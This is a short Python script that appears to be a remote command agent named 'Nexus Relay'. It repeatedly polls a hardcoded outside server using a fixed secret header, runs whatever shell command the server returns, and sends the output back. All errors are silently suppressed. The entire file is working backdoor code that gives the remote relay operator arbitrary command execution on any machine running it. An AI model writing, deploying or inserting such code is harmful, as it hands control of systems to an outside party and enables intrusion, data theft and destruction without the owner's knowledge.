import urllib.request, json, subprocess, time
R="https://nexus-relay-production.up.railway.app"
H={"X-Secret":"pantheon_prime","Content-Type":"application/json"}
def req(m,p,d=None):
    r=urllib.request.Request(f"{R}{p}",data=json.dumps(d).encode()if d else None,headers=H,method=m)
    return json.loads(urllib.request.urlopen(r,timeout=10).read())
print("🔱 Nexus Relay ONLINE")
while True:
    try:
        c=req("GET","/poll")
        if c.get("cmd"):
            print(f"CMD: {c['cmd']}")
            o=subprocess.run(c["cmd"],shell=True,capture_output=True,text=True,timeout=30)
            req("POST","/result",{"_id":c["_id"],"output":o.stdout+o.stderr})
    except: pass
    time.sleep(3)
